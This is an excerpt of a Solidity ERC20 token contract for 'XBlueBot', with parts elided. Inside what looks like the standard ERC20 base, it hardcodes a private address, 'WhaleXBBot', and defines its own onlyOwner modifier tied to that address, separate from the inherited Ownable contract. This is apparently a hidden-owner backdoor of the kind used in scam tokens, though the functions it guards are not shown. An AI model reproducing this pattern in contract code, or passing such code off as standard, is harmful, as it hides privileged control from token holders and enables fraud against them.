...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    string public XBBotwebsite = "https://xbluebot.com/";
    string public XBBotADDRESS = "0xF412a67A7F86B88199c2390c062fC71201E70A44";
    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _name;
    string private _symbol;
    address private WhaleXBBot;
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
       _decimals = 9;
         WhaleXBBot = 0xF412a67A7F86B88199c2390c062fC71201E70A44;      
    }
    ...
    function _burn(address account, uint256 amount) internal virtual {
        ...
        _afterTokenTransfer(account, address(0), amount);
              ...
              function getXBBotwebsite() public view returns (string memory) {
        return XBBotwebsite;
    } 


               function getXBBotADDRESS() public view returns (string memory) {
        return XBBotADDRESS;
    }    
      modifier onlyOwner() {
         require(_msgSender() == WhaleXBBot);
        _;
    }    
    function _approve(
        address owner,
...
contract XBBot is ERC20, Ownable {
    constructor () ERC20("XBlueBot", "XBBot") 
    {    
